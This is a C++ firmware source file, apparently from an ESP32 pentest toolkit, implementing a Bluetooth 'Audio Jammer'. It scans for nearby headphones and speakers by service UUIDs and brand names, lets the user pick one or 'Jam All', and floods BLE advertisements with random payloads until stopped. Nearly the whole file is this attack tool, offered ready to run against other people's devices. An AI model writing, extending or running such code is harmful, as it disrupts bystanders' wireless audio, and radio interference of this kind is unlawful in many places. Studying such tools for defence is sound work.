#if !LITE_VERSION
#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <NimBLEDevice.h>
#include <WiFi.h>
#include <globals.h>


struct AudioDevice {
    String address;
    String name;
    int rssi;
};

static std::vector<AudioDevice> audioDevices;


static bool isAudioDevice(const NimBLEAdvertisedDevice &dev) {

    if (dev.haveServiceUUID()) {

        if (dev.isAdvertisingService(NimBLEUUID("0000110b-0000-1000-8000-00805f9b34fb"))) return true;

        if (dev.isAdvertisingService(NimBLEUUID("0000111e-0000-1000-8000-00805f9b34fb"))) return true;

        if (dev.isAdvertisingService(NimBLEUUID("0000110a-0000-1000-8000-00805f9b34fb"))) return true;
    }


    if (dev.haveName()) {
        String name = dev.getName().c_str();
        name.toLowerCase();
        if (name.indexOf("airpod") >= 0 || name.indexOf("buds") >= 0 ||
            name.indexOf("headphone") >= 0 || name.indexOf("speaker") >= 0 ||
            name.indexOf("jbl") >= 0 || name.indexOf("sony") >= 0 ||
            name.indexOf("bose") >= 0 || name.indexOf("beats") >= 0 ||
            name.indexOf("audio") >= 0 || name.indexOf("ear") >= 0) {
            return true;
        }
    }
    return false;
}

class AudioScanCallbacks : public NimBLEScanCallbacks {
    void onResult(const NimBLEAdvertisedDevice *advertisedDevice) {
        if (isAudioDevice(*advertisedDevice)) {
            String addr = advertisedDevice->getAddress().toString().c_str();

            for (auto &d : audioDevices) {
                if (d.address == addr) return;
            }
            if (audioDevices.size() < 20) {
                AudioDevice dev;
                dev.address = addr;
                dev.name = advertisedDevice->haveName() ?
                           advertisedDevice->getName().c_str() : "Unknown Audio";
                dev.rssi = advertisedDevice->getRSSI();
                audioDevices.push_back(dev);
            }
        }
    }
};


static void jamAudioTarget(String targetAddr) {
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    int jamPackets = 0;
    int jamFailed = 0;
    unsigned long startTime = millis();

    NimBLEDevice::setSecurityAuth(false, false, false);

    while (true) {


        for (int burst = 0; burst < 10; burst++) {
            NimBLEAdvertisementData advData;


            std::string payload;
            for (int i = 0; i < 20; i++) {
                payload += (char)random(256);
            }
            advData.setManufacturerData(payload);
            advData.setFlags(0x06);

            pAdvertising->setAdvertisementData(advData);
            bool ok = pAdvertising->start();
            delay(5);
            pAdvertising->stop();
            if (ok) jamPackets++; else jamFailed++;
        }


        if (jamPackets % 50 == 0) {
            drawMainBorderWithTitle("Audio Jammer");
            int y = 45;
            int padX = 12;

            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.setTextSize(FP);
            tft.setCursor(padX, y);
            tft.print("JAMMING ACTIVE");
            y += 16;

            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setCursor(padX, y);
            tft.print("Target: " + targetAddr.substring(0, 17));
            y += 14;

            tft.setCursor(padX, y);
            tft.printf("Sent: %d  Failed: %d", jamPackets, jamFailed);
            y += 14;

            unsigned long elapsed = (millis() - startTime) / 1000;
            tft.setCursor(padX, y);
            tft.printf("Elapsed: %lus", elapsed);
            y += 14;

            tft.setCursor(padX, y);
            tft.printf("Rate: ~%d pkt/s", jamPackets / max(1UL, elapsed));

            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.drawCentreString(String("Esc to stop"), tftWidth / 2, tftHeight - 20, 1);
        }

        if (check(EscPress)) { returnToMenu = true; break; }
        esp_task_wdt_reset();
        delay(5);
    }
}

void arsenal_bt_audio_jammer(void) {
    ARSENAL_SAFE_RUN([]() {
        audioDevices.clear();

        NimBLEDevice::deinit(true);
        WiFi.disconnect(true);
        WiFi.mode(WIFI_OFF);
        delay(100);
        if (!NimBLEDevice::init("")) {
            displayError("BLE init failed", true);
            return;
        }
        NimBLEScan *pScan = NimBLEDevice::getScan();
        pScan->setScanCallbacks(new AudioScanCallbacks());
        pScan->setActiveScan(true);
        pScan->setInterval(100);
        pScan->setWindow(99);


        drawMainBorderWithTitle("Audio Jammer");
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.setTextSize(FP);
        tft.drawCentreString(String("Scanning for audio devices..."), tftWidth / 2, tftHeight / 2, 1);

        pScan->start(5, false);
        pScan->stop();
        pScan->clearResults();

        if (audioDevices.empty()) {

            options.clear();
            options.push_back({"Jam All BLE (broadcast)", []() {}});
            options.push_back({"Back", []() {}});
            loopOptions(options, MENU_TYPE_SUBMENU, "No audio found");

            if (returnToMenu) {
                NimBLEDevice::init("");
                vTaskDelay(100 / portTICK_PERIOD_MS);
                pScan->setScanCallbacks(nullptr);
                pScan = nullptr;
                vTaskDelay(100 / portTICK_PERIOD_MS);
                #if defined(CONFIG_IDF_TARGET_ESP32C5)
                esp_bt_controller_deinit();
                #else
                NimBLEDevice::deinit();
                #endif
                return;
            }

            jamAudioTarget("FF:FF:FF:FF:FF:FF");
        } else {

            options.clear();
            for (auto &dev : audioDevices) {
                String label = dev.name.substring(0, 16) + " " + String(dev.rssi) + "dB";
                options.push_back({label, [dev]() {
                    jamAudioTarget(dev.address);
                }});
            }
            options.push_back({"Jam All (broadcast)", []() {
                jamAudioTarget("FF:FF:FF:FF:FF:FF");
            }});

            loopOptions(options, MENU_TYPE_SUBMENU, "Select Target");

            if (returnToMenu) {
                NimBLEDevice::init("");
                vTaskDelay(100 / portTICK_PERIOD_MS);
                pScan->setScanCallbacks(nullptr);
                pScan = nullptr;
                vTaskDelay(100 / portTICK_PERIOD_MS);
                #if defined(CONFIG_IDF_TARGET_ESP32C5)
                esp_bt_controller_deinit();
                #else
                NimBLEDevice::deinit();
                #endif
                return;
            }
        }

        NimBLEDevice::init("");
        vTaskDelay(100 / portTICK_PERIOD_MS);
        pScan->setScanCallbacks(nullptr);
        pScan = nullptr;
        vTaskDelay(100 / portTICK_PERIOD_MS);
        #if defined(CONFIG_IDF_TARGET_ESP32C5)
        esp_bt_controller_deinit();
        #else
        NimBLEDevice::deinit();
        #endif
    });
}
#endif